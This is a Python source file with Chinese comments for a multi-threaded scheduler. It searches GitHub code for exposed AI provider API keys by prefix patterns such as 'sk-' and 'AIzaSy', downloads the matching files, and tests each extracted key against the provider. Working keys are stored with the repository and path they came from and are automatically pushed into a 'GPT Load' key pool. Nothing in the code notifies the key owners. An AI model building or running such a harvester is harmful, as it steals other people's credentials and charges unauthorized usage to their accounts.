"""
任务调度器 - 三线程架构
1. 搜索线程：GitHub 搜索 API Keys
2. 校验线程：验证 Keys 有效性
3. 同步线程：自动同步有效 Keys
"""
import os
import queue
import threading
import time
from datetime import datetime, timedelta
from typing import Dict, List

from common.Logger import logger
from common.config import config
from utils.db_manager import db_manager
from utils.sync_utils import sync_utils
from app.providers.config_based_factory import ConfigBasedAIProviderFactory


class TaskScheduler:
    """三线程任务调度器"""

    def __init__(self):
        # 任务队列
        self.search_queue = queue.Queue(maxsize=1000)  # 搜索结果队列（待校验）
        self.validation_queue = queue.Queue(maxsize=1000)  # 校验结果队列（待同步）

        # 线程控制
        self.shutdown_flag = threading.Event()
        self.threads = []

    def start(self):
        """启动所有线程"""
        # 1. 搜索线程
        search_thread = threading.Thread(
            target=self._search_worker,
            name="SearchWorker",
            daemon=True
        )
        search_thread.start()
        self.threads.append(search_thread)

        # 2. 校验线程（多个工作线程）
        for i in range(3):  # 3个校验线程并发
            validation_thread = threading.Thread(
                target=self._validation_worker,
                name=f"ValidationWorker-{i}",
                daemon=True
            )
            validation_thread.start()
            self.threads.append(validation_thread)

        # 3. 同步线程
        sync_thread = threading.Thread(
            target=self._sync_worker,
            name="SyncWorker",
            daemon=True
        )
        sync_thread.start()
        self.threads.append(sync_thread)

        logger.info("✅ Task scheduler started with 3 worker types")

    def _search_worker(self):
        """搜索线程：执行 GitHub 搜索"""
        from utils.github_client import GitHubClient

        github_client = GitHubClient(config.GITHUB_TOKENS)

        while not self.shutdown_flag.is_set():
            try:
                # 获取搜索查询
                search_queries = self._get_search_queries()

                if not search_queries:
                    logger.warning("⚠️ No search queries, sleeping...")
                    time.sleep(300)
                    continue

                logger.info(f"🔍 Starting search with {len(search_queries)} queries")

                for i, query in enumerate(search_queries, 1):
                    if self.shutdown_flag.is_set():
                        break

                    try:
                        result = github_client.search_for_keys(query)

                        if result and "items" in result:
                            for item in result["items"]:
                                # 放入校验队列
                                self.search_queue.put({
                                    'item': item,
                                    'query': query
                                })

                        # API 限流控制
                        if i % 5 == 0:
                            time.sleep(2)

                    except Exception as e:
                        logger.error(f"Search error for query '{query}': {e}")

                # 搜索完成，等待下次执行
                next_run_hour = int(os.getenv("DAILY_RUN_HOUR", "3"))
                next_run = datetime.now().replace(hour=next_run_hour, minute=0, second=0)
                if next_run <= datetime.now():
                    next_run += timedelta(days=1)

                sleep_seconds = (next_run - datetime.now()).total_seconds()
                logger.info(f"💤 Search complete, next run at {next_run.strftime('%Y-%m-%d %H:%M:%S')}")
                time.sleep(sleep_seconds)

            except Exception as e:
                logger.error(f"Search worker error: {e}")
                time.sleep(60)

    def _validation_worker(self):
        """校验线程：验证 Keys"""
        from app.providers.config_key_extractor import ConfigKeyExtractor

        while not self.shutdown_flag.is_set():
            try:
                # 从搜索队列获取任务
                task = self.search_queue.get(timeout=30)

                item = task['item']
                file_sha = item.get("sha")
                file_url = item.get("html_url", "")
                file_path = item.get("path", "")
                repo_name = item["repository"]["full_name"]

                # 检查是否已扫描
                if db_manager.is_file_scanned(file_sha):
                    continue

                # 下载文件内容
                from utils.github_client import GitHubClient
                github_client = GitHubClient(config.GITHUB_TOKENS)
                content = github_client.get_file_content(item)

                if not content:
                    continue

                # 提取并验证 Keys
                extracted = ConfigKeyExtractor.extract_all_keys(content)

                for provider_name, keys in extracted.items():
                    if not keys:
                        continue

                    provider = ConfigBasedAIProviderFactory.get_provider_by_name(provider_name)
                    if not provider:
                        continue

                    for key in keys:
                        validation_result = provider.validate_key(key)

                        if validation_result and "ok" in validation_result:
                            status = 'valid'
                            logger.info(f"✅ VALID {provider_name.upper()}: {key[:20]}...")
                        elif "rate_limited" in validation_result:
                            status = 'rate_limited'
                            logger.warning(f"⚠️ RATE LIMITED {provider_name.upper()}: {key[:20]}...")
                        else:
                            status = 'invalid'
                            logger.info(f"❌ INVALID {provider_name.upper()}: {key[:20]}...")

                        # 保存到数据库
                        group_name = ConfigKeyExtractor.get_gpt_load_group_name(provider_name)
                        key_id = db_manager.save_api_key(
                            api_key=key,
                            provider=provider_name,
                            status=status,
                            source_repo=repo_name,
                            source_file_path=file_path,
                            source_file_url=file_url,
                            source_file_sha=file_sha,
                            gpt_load_group_name=group_name,
                            metadata={'validation_result': validation_result}
                        )

                        # 有效的 Key 放入同步队列
                        if status == 'valid' and key_id:
                            self.validation_queue.put({
                                'key_id': key_id,
                                'key': key,
                                'provider': provider_name,
                                'group_name': group_name
                            })

                # 标记文件已扫描
                db_manager.mark_file_scanned(
                    file_sha=file_sha,
                    repo=repo_name,
                    file_path=file_path,
                    file_url=file_url
                )

                self.search_queue.task_done()

            except queue.Empty:
                continue
            except Exception as e:
                import traceback
                logger.error(f"Validation worker error: {e}")
                logger.error(traceback.format_exc())

    def _sync_worker(self):
        """同步线程：自动同步有效 Keys"""
        while not self.shutdown_flag.is_set():
            try:
                # 从校验队列获取任务
                task = self.validation_queue.get(timeout=30)

                key_id = task['key_id']
                key = task['key']
                group_name = task['group_name']

                # 执行同步
                logger.info(f"🔄 Syncing key {key_id} to GPT Load...")

                result = sync_utils._send_gpt_load_worker([key], group_name)

                if result == "success":
                    db_manager.mark_key_synced(key_id, 'gpt_load', success=True)
                    logger.info(f"✅ Synced key {key_id}")
                else:
                    db_manager.mark_key_synced(key_id, 'gpt_load', success=False, error_message=result)
                    logger.error(f"❌ Failed to sync key {key_id}: {result}")

                self.validation_queue.task_done()

                # 同步限流
                time.sleep(1)

            except queue.Empty:
                # 队列为空时，检查数据库中的待同步 Keys
                self._sync_pending_keys()
                time.sleep(60)  # 每分钟检查一次
            except Exception as e:
                logger.error(f"Sync worker error: {e}")

    def _sync_pending_keys(self):
        """同步数据库中的待同步 Keys"""
        try:
            pending_keys = db_manager.get_pending_sync_keys('gpt_load', limit=10)

            if not pending_keys:
                return

            logger.info(f"🔄 Found {len(pending_keys)} pending keys in database")

            for key_obj in pending_keys:
                try:
                    from utils.crypto import key_encryption
                    decrypted_key = key_encryption.decrypt_key(key_obj.key_encrypted)

                    result = sync_utils._send_gpt_load_worker([decrypted_key], key_obj.gpt_load_group_name or "")

                    if result == "success":
                        db_manager.mark_key_synced(key_obj.id, 'gpt_load', success=True)
                    else:
                        db_manager.mark_key_synced(key_obj.id, 'gpt_load', success=False, error_message=result)

                    time.sleep(1)

                except Exception as e:
                    logger.error(f"Failed to sync pending key {key_obj.id}: {e}")

        except Exception as e:
            logger.error(f"Failed to sync pending keys: {e}")

    def _get_search_queries(self):
        """获取搜索查询（自动生成，数据库模式）"""
        auto_queries = []
        providers = config.AI_PROVIDERS_CONFIG

        # 简化的自动生成（只生成核心查询）
        languages = ['python', 'javascript', 'typescript', 'go']

        for provider in providers:
            patterns = provider.get('key_patterns', [])
            provider_name = provider.get('name', '').upper()

            for pattern in patterns:
                import re
                if pattern.startswith('AIzaSy'):
                    prefix = 'AIzaSy'
                elif pattern.startswith('sk-'):
                    prefix = 'sk-'
                elif pattern.startswith('csk-'):
                    prefix = 'csk-'
                else:
                    match = re.match(r'^([A-Za-z0-9\-_]{3,10})', pattern)
                    if match:
                        prefix = match.group(1)
                    else:
                        continue

                # 核心查询
                for lang in languages:
                    auto_queries.append(f'"{provider_name}_API_KEY" = "{prefix}" language:{lang}')

        return auto_queries

    def shutdown(self):
        """停止所有线程"""
        logger.info("🛑 Shutting down task scheduler...")
        self.shutdown_flag.set()

        for thread in self.threads:
            thread.join(timeout=5)

        logger.info("✅ Task scheduler stopped")


# 全局实例
task_scheduler = TaskScheduler()
